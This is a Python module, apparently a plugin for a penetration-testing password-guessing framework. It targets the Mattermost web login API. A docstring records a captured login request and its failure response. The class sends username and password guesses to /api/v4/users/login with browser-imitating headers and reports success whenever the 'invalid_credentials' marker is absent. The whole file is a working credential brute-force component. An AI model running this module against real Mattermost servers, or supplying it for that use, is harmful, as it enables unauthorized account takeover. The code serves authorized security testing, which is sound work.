from re import search
import requests
import warnings
import urllib
warnings.filterwarnings('ignore')
from bfg.shortcuts.http import HTTPModule, handleUA

'''
# Notes

## Authentication Request

POST /api/v4/users/login HTTP/1.1
Host: mattermost.xxxxxxxxxxx.com
Connection: close
Content-Length: 78
Sec-Fetch-Dest: empty
X-Requested-With: XMLHttpRequest
Accept-Language: en
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.66 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://mattermost.xxxxxxxxxxx.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate

{"device_id":"","login_id":"thisis@bhis.com","password":"password","token":""}

## Authentication Response (FAIL)

HTTP/1.1 401 Unauthorized
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 14 Feb 2020 19:43:20 GMT
Content-Type: application/json
Content-Length: 199
Connection: close
Strict-Transport-Security: max-age=63072000
Vary: Accept-Encoding

{"id":"api.user.login.invalid_credentials_email_username","message":"Enter a valid email or username and/or password.","detailed_error":"","request_id":"n69gxwj1spyapey6h4mnxshtgc","status_code":401}
'''

class Module(HTTPModule):

    description = brief_description = 'Mattermost login web interface'
    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    def __call__(self, username, password, *args, **kwargs):

        # Align headers to avoid issues
        if not 'Sec-Fetch-Dest' in self.headers:
            self.headers['Sec-Fetch-Dest'] = 'empty'
        if not 'X-Requested-With' in self.headers:
            self.headers['X-Requested-With'] = 'XMLHttpRequest'
        if not 'Sec-Fetch-Site' in self.headers:
            self.headers['Sec-Fetch-Site'] = 'same-origin'
        if not 'Sec-Fetch-Mode' in self.headers:
            self.headers['Sec-Fetch-Mode'] = 'cors'
        
        data = {
            'device_id':'',
            'login_id':username,
            'password':password,
            'token':'',
        }

        resp = requests.post(
            self.url, json=data, headers=self.headers,
            verify=self.verify_ssl, allow_redirects=False,
            proxies=self.proxies
        )

        if resp.text.find('invalid_credentials') > -1:
            return dict(outcome=0, username=username, password=password)
        else:
            return dict(outcome=1, username=username, password=password)
